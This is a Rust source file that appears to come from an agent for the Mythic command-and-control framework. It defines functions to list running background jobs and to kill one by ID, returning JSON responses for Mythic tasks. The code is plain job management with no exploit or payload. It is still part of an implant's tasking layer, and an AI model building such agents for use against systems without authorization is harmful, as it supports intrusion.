use crate::agent::AgentTask;
use crate::tasking::BackgroundTask;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::sync::atomic::Ordering;

/// Arguments for the jobkill command
#[derive(Deserialize, Serialize)]
struct JobKillArgs {
    /// Job ID to kill
    job_id: u32,
}

/// List all currently running background jobs
/// * `task` - Task information from Mythic
/// * `background_tasks` - List of currently running background tasks
pub fn list_jobs(task: &AgentTask, background_tasks: &[BackgroundTask]) -> serde_json::Value {
    let mut jobs = Vec::new();

    for job in background_tasks {
        if job.running.load(Ordering::SeqCst) {
            jobs.push(json!({
                "id": job.id,
                "command": job.command,
                "parameters": job.parameters,
                "killable": job.killable,
                "uuid": job.uuid
            }));
        }
    }

    let output = json!({
        "active_jobs": jobs,
        "total_count": jobs.len()
    });

    json!({
        "task_id": task.id,
        "status": "success",
        "user_output": serde_json::to_string_pretty(&output).unwrap_or_default(),
        "completed": true,
    })
}

/// Kill a specific background job
/// * `task` - Task information from Mythic
/// * `background_tasks` - List of currently running background tasks
pub fn kill_job(
    task: &AgentTask,
    background_tasks: &[BackgroundTask],
) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
    let args: JobKillArgs = serde_json::from_str(&task.parameters)?;
    let mut responses = Vec::new();

    // Find the job to kill
    for job in background_tasks {
        if job.id == args.job_id {
            if !job.killable {
                responses.push(json!({
                    "task_id": task.id,
                    "status": "error",
                    "user_output": format!("Job {} ({}) cannot be manually killed", args.job_id, job.command),
                    "completed": true,
                }));
            } else {
                // Signal the job to stop
                job.running.store(false, Ordering::SeqCst);
                responses.push(json!({
                    "task_id": task.id,
                    "status": "success",
                    "user_output": format!("Killed job {} ({})", args.job_id, job.command),
                    "completed": true,
                }));
            }
            return Ok(responses);
        }
    }

    // Job not found
    responses.push(json!({
        "task_id": task.id,
        "status": "error",
        "user_output": format!("Job {} not found", args.job_id),
        "completed": true,
    }));

    Ok(responses)
}
